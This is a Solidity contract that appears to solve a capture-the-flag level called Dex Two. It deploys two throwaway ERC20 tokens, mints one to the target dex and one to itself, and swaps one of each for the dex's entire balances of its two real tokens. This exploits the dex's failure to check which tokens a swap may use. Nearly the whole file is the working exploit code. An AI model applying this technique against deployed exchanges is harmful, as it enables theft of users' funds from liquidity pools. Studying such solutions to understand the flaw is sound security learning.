// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/token/ERC20/ERC20.sol";
import "./DexTwo.sol";

contract SolveDexTwo {
  constructor(DexTwo instance) {
    // Deploy two of your own tokens
    SolutionToken s1 = new SolutionToken(address(instance));
    SolutionToken s2 = new SolutionToken(address(instance));

    // Give dex approval to spend s1 and s2
    s1.approve(address(instance), 1);
    s2.approve(address(instance), 1);

    SwappableTokenTwo token1 = SwappableTokenTwo(instance.token1());
    SwappableTokenTwo token2 = SwappableTokenTwo(instance.token2());

    // swap 1 s1 for 100 token1
    instance.swap(address(s1), address(token1), 1);
    // swap 1 s2 for 100 token2
    instance.swap(address(s2), address(token2), 1);
  }
}

contract SolutionToken is ERC20 {
    constructor(address dexInstance)
        ERC20("SolutionToken", "SOLT")
    {
        // give 1 token to and the msg.sender
        _mint(dexInstance, 1);
        _mint(msg.sender, 1);
    }
}
